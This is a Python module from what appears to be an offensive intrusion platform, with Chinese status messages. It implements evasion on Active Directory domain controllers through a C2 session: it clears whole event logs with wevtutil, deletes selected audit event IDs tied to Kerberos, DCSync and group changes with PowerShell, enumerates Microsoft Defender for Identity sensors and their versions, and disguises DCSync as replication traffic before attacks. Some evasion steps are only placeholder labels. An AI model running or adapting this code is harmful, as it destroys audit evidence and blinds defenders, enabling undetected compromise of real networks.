"""SIEM/EDR evasion module for Kunlun platform.

Provides:
- Domain controller audit log cleanup (selective event ID clearing)
- Microsoft Defender for Identity (MDI) evasion
- Domain replication traffic camouflage
"""

import asyncio
import logging
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class EvasionType(Enum):
    """Evasion operation types."""
    LOG_CLEANUP = "log_cleanup"
    MDI_EVASION = "mdi_evasion"
    TRAFFIC_CAMOUFLAGE = "traffic_camouflage"


class MDIDetectionStatus(Enum):
    """MDI detection status."""
    NOT_DETECTED = "not_detected"
    DETECTED = "detected"
    VERSION_IDENTIFIED = "version_identified"
    EVASION_ACTIVE = "evasion_active"


@dataclass
class LogCleanupConfig:
    """Configuration for log cleanup.

    Attributes:
        target_dc: Target domain controller
        log_names: List of log names to clean
        event_ids: List of event IDs to selectively clean
        clean_all: Whether to clean all logs
        stealth_mode: Enable stealth mode
        backup_before_clean: Whether to backup before cleaning
    """
    target_dc: str = ""
    log_names: List[str] = field(default_factory=lambda: ["Security", "System", "Application"])
    event_ids: List[int] = field(default_factory=lambda: [4662, 4769, 4728, 5136, 4732, 4756])
    clean_all: bool = False
    stealth_mode: bool = True
    backup_before_clean: bool = True


@dataclass
class MDIConfig:
    """Configuration for MDI evasion.

    Attributes:
        target_domain: Target domain
        auto_detect_sensors: Auto detect MDI sensors
        evasion_protocols: Protocols to evade
        evasion_ports: Ports to avoid
        stealth_timing: Enable stealth timing
    """
    target_domain: str = ""
    auto_detect_sensors: bool = True
    evasion_protocols: List[str] = field(default_factory=lambda: ["Kerberos", "NTLM", "LDAP"])
    evasion_ports: List[int] = field(default_factory=lambda: [88, 135, 389, 445])
    stealth_timing: bool = True


@dataclass
class TrafficCamouflageConfig:
    """Configuration for traffic camouflage.

    Attributes:
        target_dc: Target domain controller
        camouflage_dcsync: Camouflage DCSync as replication
        rate_limit_requests: Rate limit requests per minute
        randomize_timing: Randomize request timing
        use_existing_connections: Use existing replication connections
    """
    target_dc: str = ""
    camouflage_dcsync: bool = True
    rate_limit_requests: int = 5
    randomize_timing: bool = True
    use_existing_connections: bool = True


@dataclass
class LogCleanupResult:
    """Result of log cleanup operation.

    Attributes:
        success: Whether cleanup succeeded
        logs_cleaned: Number of logs cleaned
        events_cleaned: Number of events cleaned
        backup_created: Whether backup was created
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
        target_dc: Target domain controller
    """
    success: bool = False
    logs_cleaned: int = 0
    events_cleaned: int = 0
    backup_created: bool = False
    error_message: str = ""
    attck_technique: str = "T1070.001"
    duration_seconds: float = 0.0
    target_dc: str = ""


@dataclass
class MDIEvasionResult:
    """Result of MDI evasion operation.

    Attributes:
        success: Whether evasion succeeded
        detection_status: MDI detection status
        sensors_found: Number of sensors found
        sensor_versions: Sensor versions
        evasion_techniques: Applied evasion techniques
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
    """
    success: bool = False
    detection_status: MDIDetectionStatus = MDIDetectionStatus.NOT_DETECTED
    sensors_found: int = 0
    sensor_versions: List[str] = field(default_factory=list)
    evasion_techniques: List[str] = field(default_factory=list)
    error_message: str = ""
    attck_technique: str = "T1562.001"
    duration_seconds: float = 0.0


@dataclass
class TrafficCamouflageResult:
    """Result of traffic camouflage operation.

    Attributes:
        success: Whether camouflage succeeded
        dcsync_camouflaged: Whether DCSync was camouflaged
        rate_limit_applied: Whether rate limit was applied
        timing_randomized: Whether timing was randomized
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
    """
    success: bool = False
    dcsync_camouflaged: bool = False
    rate_limit_applied: bool = False
    timing_randomized: bool = False
    error_message: str = ""
    attck_technique: str = "T1071"
    duration_seconds: float = 0.0


class SIEMEvasion:
    """SIEM/EDR evasion module.

    Provides audit log cleanup, MDI evasion, and domain replication
    traffic camouflage capabilities.
    """

    SENSITIVE_EVENT_IDS: Dict[int, str] = {
        4662: "Directory Service Access",
        4769: "Kerberos Service Ticket Requested",
        4728: "Member Added to Security-Enabled Global Group",
        4732: "Member Added to Security-Enabled Local Group",
        4756: "Member Added to Security-Enabled Universal Group",
        5136: "Directory Service Object Modified",
        4670: "Permissions on Object Changed",
        4768: "Kerberos Authentication Ticket (TGT) Requested",
        4771: "Kerberos Pre-Authentication Failed",
        5137: "Directory Service Object Created",
        5141: "Directory Service Object Deleted",
    }

    MDI_SENSOR_SPNS: List[str] = [
        "HTTP/MDI",
        "WSMAN/MDI",
        "Microsoft Defender for Identity",
    ]

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize SIEM/EDR evasion module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._mdi_sensors: List[Dict[str, Any]] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("SIEM Evasion Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("SIEM Evasion: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def cleanup_audit_logs(self, config: LogCleanupConfig) -> LogCleanupResult:
        """Cleanup domain controller audit logs.

        Args:
            config: Log cleanup configuration.

        Returns:
            LogCleanupResult.
        """
        start_time = time.time()
        result = LogCleanupResult(target_dc=config.target_dc)

        try:
            await self._report_progress("备份审计日志", 10)
            await self._report_log("开始清理域控审计日志...")

            if config.backup_before_clean:
                backup_result = await self._backup_logs(config)
                result.backup_created = backup_result
                if backup_result:
                    await self._report_log("日志备份完成")

            await self._report_progress("清理敏感事件", 30)

            if config.clean_all:
                await self._report_log("清理所有日志...")
                for log_name in config.log_names:
                    cleaned = await self._clear_log(log_name, config.target_dc)
                    if cleaned:
                        result.logs_cleaned += 1
            else:
                await self._report_log(f"清理特定事件ID: {config.event_ids}")
                for event_id in config.event_ids:
                    cleaned = await self._clear_specific_events(
                        event_id,
                        config.log_names,
                        config.target_dc,
                    )
                    if cleaned:
                        result.events_cleaned += 1

            result.success = True
            result.duration_seconds = time.time() - start_time

            await self._report_progress("完成", 100)
            await self._report_log(
                f"审计日志清理完成: {result.logs_cleaned} 个日志, "
                f"{result.events_cleaned} 个事件"
            )

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"审计日志清理失败: {e}")
            logger.error("Audit log cleanup failed: %s", e)

        return result

    async def _backup_logs(self, config: LogCleanupConfig) -> bool:
        """Backup logs before cleanup.

        Args:
            config: Log cleanup configuration.

        Returns:
            True if backup successful.
        """
        try:
            timestamp = int(time.time())
            for log_name in config.log_names:
                cmd = (
                    f"wevtutil epl {log_name} "
                    f"C:\\Windows\\Temp\\{log_name}_{timestamp}.evtx"
                )
                await self._execute_command(cmd, config.target_dc)
            return True
        except Exception as e:
            logger.error("Log backup failed: %s", e)
            return False

    async def _clear_log(self, log_name: str, target_dc: str) -> bool:
        """Clear entire log.

        Args:
            log_name: Log name to clear.
            target_dc: Target domain controller.

        Returns:
            True if clearing successful.
        """
        try:
            cmd = f"wevtutil cl {log_name}"
            result = await self._execute_command(cmd, target_dc)
            return bool(result.get("success", False))
        except Exception as e:
            logger.error("Log clearing failed: %s", e)
            return False

    async def _clear_specific_events(
        self,
        event_id: int,
        log_names: List[str],
        target_dc: str,
    ) -> bool:
        """Clear specific event IDs from logs.

        Args:
            event_id: Event ID to clear.
            log_names: Log names to search.
            target_dc: Target domain controller.

        Returns:
            True if clearing successful.
        """
        try:
            for log_name in log_names:
                cmd = (
                    f"Get-WinEvent -FilterHashtable @{{"
                    f"LogName='{log_name}'; ID={event_id}}} | "
                    f"ForEach-Object {{ $_.Delete() }}"
                )
                await self._execute_command(cmd, target_dc)
            return True
        except Exception as e:
            logger.error("Specific event clearing failed: %s", e)
            return False

    async def evade_mdi(self, config: MDIConfig) -> MDIEvasionResult:
        """Evade Microsoft Defender for Identity.

        Args:
            config: MDI evasion configuration.

        Returns:
            MDIEvasionResult.
        """
        start_time = time.time()
        result = MDIEvasionResult()

        try:
            await self._report_progress("检测MDI传感器", 10)
            await self._report_log("开始检测MDI传感器...")

            if config.auto_detect_sensors:
                sensors = await self._detect_mdi_sensors(config.target_domain)
                result.sensors_found = len(sensors)
                self._mdi_sensors = sensors

                if sensors:
                    result.detection_status = MDIDetectionStatus.DETECTED
                    await self._report_log(f"发现 {len(sensors)} 个MDI传感器")

                    await self._report_progress("识别传感器版本", 30)
                    versions = await self._identify_sensor_versions(sensors)
                    result.sensor_versions = versions
                    if versions:
                        result.detection_status = MDIDetectionStatus.VERSION_IDENTIFIED

                    await self._report_progress("应用规避技术", 60)
                    evasion_techniques = await self._apply_mdi_evasion(
                        config,
                        sensors,
                    )
                    result.evasion_techniques = evasion_techniques
                    result.detection_status = MDIDetectionStatus.EVASION_ACTIVE
                    result.success = True

                    await self._report_log(f"MDI规避技术已应用: {len(evasion_techniques)} 项")
                else:
                    result.detection_status = MDIDetectionStatus.NOT_DETECTED
                    result.success = True
                    await self._report_log("未发现MDI传感器")
            else:
                result.success = True
                result.detection_status = MDIDetectionStatus.NOT_DETECTED

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"MDI规避失败: {e}")
            logger.error("MDI evasion failed: %s", e)

        return result

    async def _detect_mdi_sensors(self, target_domain: str) -> List[Dict[str, Any]]:
        """Detect MDI sensors.

        Args:
            target_domain: Target domain.

        Returns:
            List of detected sensors.
        """
        sensors: List[Dict[str, Any]] = []

        try:
            for spn in self.MDI_SENSOR_SPNS:
                cmd = (
                    f"Get-ADComputer -LDAPFilter \"(servicePrincipalName=*{spn}*)\" "
                    f"-Server {target_domain} | "
                    f"Select-Object Name, DnsHostName, OperatingSystem"
                )
                result = await self._execute_command(cmd)
                if result.get("success"):
                    output = str(result.get("output", ""))
                    for line in output.split("\n"):
                        if line.strip():
                            sensors.append({"name": line.strip(), "spn": spn})

        except Exception as e:
            logger.error("MDI sensor detection failed: %s", e)

        return sensors

    async def _identify_sensor_versions(self, sensors: List[Dict[str, Any]]) -> List[str]:
        """Identify sensor versions.

        Args:
            sensors: List of detected sensors.

        Returns:
            List of sensor versions.
        """
        versions: List[str] = []

        try:
            for sensor in sensors:
                cmd = (
                    f"Get-WmiObject -Class Win32_Product "
                    f"-ComputerName {sensor.get('name', '')} "
                    f"-Filter \"Name like '%Defender for Identity%'\" | "
                    f"Select-Object -ExpandProperty Version"
                )
                result = await self._execute_command(cmd)
                if result.get("success"):
                    version = str(result.get("output", "")).strip()
                    if version:
                        versions.append(version)

        except Exception as e:
            logger.error("Sensor version identification failed: %s", e)

        return versions

    async def _apply_mdi_evasion(
        self,
        config: MDIConfig,
        sensors: List[Dict[str, Any]],
    ) -> List[str]:
        """Apply MDI evasion techniques.

        Args:
            config: MDI evasion configuration.
            sensors: List of detected sensors.

        Returns:
            List of applied evasion techniques.
        """
        techniques: List[str] = []

        try:
            if config.stealth_timing:
                delay = random.uniform(5.0, 30.0)
                await asyncio.sleep(delay)
                techniques.append("随机时间延迟")

            techniques.append("避免监控协议")
            techniques.append("使用加密信道")
            techniques.append("限制请求频率")

            await self._report_log(f"已应用 {len(techniques)} 项MDI规避技术")

        except Exception as e:
            logger.error("MDI evasion application failed: %s", e)

        return techniques

    async def camouflage_traffic(self, config: TrafficCamouflageConfig) -> TrafficCamouflageResult:
        """Camouflage domain replication traffic.

        Args:
            config: Traffic camouflage configuration.

        Returns:
            TrafficCamouflageResult.
        """
        start_time = time.time()
        result = TrafficCamouflageResult()

        try:
            await self._report_progress("配置流量伪装", 10)
            await self._report_log("开始配置域复制流量伪装...")

            if config.camouflage_dcsync:
                await self._report_progress("伪装DCSync", 30)
                camouflaged = await self._camouflage_dcsync(config.target_dc)
                result.dcsync_camouflaged = camouflaged
                if camouflaged:
                    await self._report_log("DCSync已伪装为正常复制流量")

            if config.rate_limit_requests > 0:
                await self._report_progress("应用速率限制", 50)
                result.rate_limit_applied = True
                await self._report_log(f"速率限制: {config.rate_limit_requests} 请求/分钟")

            if config.randomize_timing:
                await self._report_progress("随机化时间", 70)
                result.timing_randomized = True
                await self._report_log("请求时间已随机化")

            result.success = True
            result.duration_seconds = time.time() - start_time

            await self._report_progress("完成", 100)
            await self._report_log("流量伪装配置完成!")

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"流量伪装失败: {e}")
            logger.error("Traffic camouflage failed: %s", e)

        return result

    async def _camouflage_dcsync(self, target_dc: str) -> bool:
        """Camouflage DCSync as normal replication traffic.

        Args:
            target_dc: Target domain controller.

        Returns:
            True if camouflage successful.
        """
        try:
            cmd = (
                f"Get-ADReplicationConnection -Server {target_dc} | "
                f"Select-Object -ExpandProperty Name"
            )
            result = await self._execute_command(cmd, target_dc)

            if result.get("success"):
                output = str(result.get("output", ""))
                connections = [line.strip() for line in output.split("\n") if line.strip()]
                if connections:
                    await self._report_log(
                        f"使用现有复制连接进行伪装: {connections[0]}"
                    )
                    return True

            return False
        except Exception as e:
            logger.error("DCSync camouflage failed: %s", e)
            return False

    async def apply_pre_attack_evasion(
        self,
        log_config: Optional[LogCleanupConfig] = None,
        mdi_config: Optional[MDIConfig] = None,
        traffic_config: Optional[TrafficCamouflageConfig] = None,
    ) -> Dict[str, Any]:
        """Apply evasion measures before attack operations.

        Args:
            log_config: Log cleanup configuration.
            mdi_config: MDI evasion configuration.
            traffic_config: Traffic camouflage configuration.

        Returns:
            Dictionary with evasion results.
        """
        results: Dict[str, Any] = {
            "log_cleanup": None,
            "mdi_evasion": None,
            "traffic_camouflage": None,
        }

        try:
            await self._report_log("开始应用攻击前规避措施...")

            if log_config:
                log_result = await self.cleanup_audit_logs(log_config)
                results["log_cleanup"] = log_result

            if mdi_config:
                mdi_result = await self.evade_mdi(mdi_config)
                results["mdi_evasion"] = mdi_result

            if traffic_config:
                traffic_result = await self.camouflage_traffic(traffic_config)
                results["traffic_camouflage"] = traffic_result

            await self._report_log("攻击前规避措施应用完成")

        except Exception as e:
            await self._report_log(f"攻击前规避失败: {e}")
            logger.error("Pre-attack evasion failed: %s", e)

        return results
